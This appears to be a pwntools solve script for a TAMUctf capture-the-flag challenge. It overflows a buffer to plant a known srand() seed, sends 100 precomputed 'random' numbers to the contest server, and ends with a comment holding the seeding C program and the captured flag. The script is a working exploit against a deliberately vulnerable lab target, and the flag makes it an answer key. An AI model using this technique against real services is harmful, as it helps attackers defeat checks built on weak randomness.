from pwn import * 

# p = process('./troll')
p = remote('challenges.tamuctf.com', 4765)

p.recvuntil('?')
p.sendline('A'*68) # Overwrite srand() value on stack
p.recvuntil('it?')

data = [28161,57743,58616,50601,41669,81055,13066,50050,68627,1092,90316,82558,33391,29836,53905,51727,49442,32413,93310,98334,53067,1540,12500,55713,20396,74904,99454,85690,83241,65194,29366,11401,22936,4333,78354,80957,85388,91419,47358,54014,8862,37673,36571,42253,83861,6827,10331,33302,39240,19992,31635,8658,21531,44134,64370,58279,35389,63823,43968,18629,45369,89685,46382,68304,10370,24735,65612,95757,32505,12969,66122,41366,66994,19044,99970,50854,25871,10300,84155,81462,30292,15789,90119,68174,59922,70841,42804,11662,51015,3123,30290,96383,92808,76671,64687,3177,17757,46650,15285,50261]

def send_number(number):
	print(f"[*] Sending: " + number)
	p.sendline(number)
	p.recvuntil('Impressive.')


for x in data:
	print(x)
	send_number(str(x))

print(p.recv(512).decode())


'''
You've guessed all of my numbers. Here is your reward.
gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}

data[...] from srand.c:
#include <stdio.h>
#include <time.h>

void main()
{
	srand(0x41414141);
	for(int i = 0 ; i <= 99; ++i) {
		unsigned int random = rand() % 100000 + 1;
		printf("wylosowane: %d\n", random);
	}
}

'''